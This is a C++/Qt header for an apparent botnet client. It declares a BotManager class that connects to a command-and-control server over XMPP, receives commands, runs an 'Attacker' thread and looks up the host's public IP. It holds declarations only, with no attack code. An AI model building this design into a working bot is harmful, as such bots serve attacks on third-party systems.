#ifndef BOTMANAGER_H
#define BOTMANAGER_H

#include <QObject>
#include <QString>

#define IP_ADDRESS_API "http://api.ipify.org"

class XmppClient;
class Bot;
class Message;
class QThread;
class Attacker;
class QNetworkAccessManager;
class QNetworkReply;

class BotManager : public QObject
{
    Q_OBJECT
public:
    static BotManager *instance();
signals:
    void ready();
public slots:
    void connectToCC();
    void disconnectFromCC();
private slots:
    void readyOnXmppClient();
    void commandReceivedOnBot(Message *command);
    void attackDone();
    void finishedOnNetworkAccessManager(QNetworkReply *reply);
private:
    BotManager();
    ~BotManager();
    void createConnections();
    void setupConfig();
    void setupBot(const QString& pubIp);
    void sendHttpGetRequestToDiscoverIp();
    void writeEvent(const QString& event);

    XmppClient *_xmppClient;
    Bot *_bot;
    QThread *_attackerThread;
    Attacker *_attacker;
    QNetworkAccessManager *_networkAccessManager;
};

#endif // BOTMANAGER_H
